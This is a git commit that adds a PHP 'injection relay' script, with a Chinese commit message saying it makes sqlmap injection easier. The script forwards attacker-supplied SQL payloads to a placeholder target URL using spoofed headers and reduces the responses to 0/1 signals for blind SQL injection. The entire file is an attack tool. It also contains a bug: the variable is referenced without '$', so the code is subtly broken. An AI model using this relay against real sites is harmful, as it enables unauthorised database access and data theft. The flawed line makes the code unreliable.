8be134c53f7a4f513a120ff3074195e0fedbdf9c
m0xiaoxi <momomomoxiaoxi@gmail.com>
2017-10-16 22:18:38 +0800

    增加SQL注入中转脚本,方便sqlmap注入'

---
+++ Scripts/proxy.php
@@ -0,0 +1,28 @@
+<?php
+// 注入中转脚本
+set_time_limit(0);
+$inject_sql = $_POST['checked'];
+$host ='http://xxx/xxx';
+$content = "begin" . inject_sql .'end';
+$header = array("Content-Type: application/x-www-form-urlencoded",
+    "X-Requested-With: XMLHttpRequest",
+    "User-Agent: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4",
+    "Content-Length: ".strlen($content));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $host);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLINFO_HEADER_OUT, TRUE);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+$result=curl_exec($ch);
+//var_dump($result);
+curl_close($ch);
+if(strstr($result, "string")){
+    echo "error";
+}else if(strstr($result, "500")){
+    echo 1;
+}else{
+    echo 0;
+}
+?>
